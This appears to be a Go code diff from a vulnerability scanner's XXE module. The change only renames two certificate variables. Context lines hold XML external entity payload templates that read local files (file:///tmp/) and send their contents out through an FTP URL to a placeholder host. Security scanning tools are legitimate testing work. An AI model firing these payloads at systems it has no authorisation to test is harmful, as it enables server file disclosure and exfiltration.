@@ -13,8 +13,8 @@ import (
 )
 
 var DefaultProxy = ""
-var cert string
-var mkey string
+var Cert string
+var Mkey string
 
 var ftp_template = `<!ENTITY % bbb SYSTEM "file:///tmp/"><!ENTITY % ccc "<!ENTITY &#37; ddd SYSTEM 'ftp://fakeuser:%bbb;@%HOSTNAME%:%FTP_PORT%/b'>">`
 var ftp_client_file_template = `<!ENTITY % ccc "<!ENTITY &#37; ddd SYSTEM 'ftp://fakeuser:%bbb;@%HOSTNAME%:%FTP_PORT%/b'>">`
@@ -44,15 +44,15 @@ func Xxe(args interface{}) (*util.ScanResult, error) {
 	method := session["method"].(string)
 	headers, _ := util.ConvertHeaders(session["headers"].(map[string]interface{}))
 	body := []byte(session["data"].(string))
-	cert = group.HttpsCert
-	mkey = group.HttpsCertKey
+	Cert = group.HttpsCert
+	Mkey = group.HttpsCertKey
 	sess := fastreq.GetSessionByOptions(
 		&fastreq.ReqOptions{
 			Timeout:       2,
 			AllowRedirect: true,
 			Proxy:         DefaultProxy,
-			Cert:          cert,
-			PrivateKey:    mkey,
+			Cert:          Cert,
+			PrivateKey:    Mkey,
 		})
 
 	var ContentType string = "None"
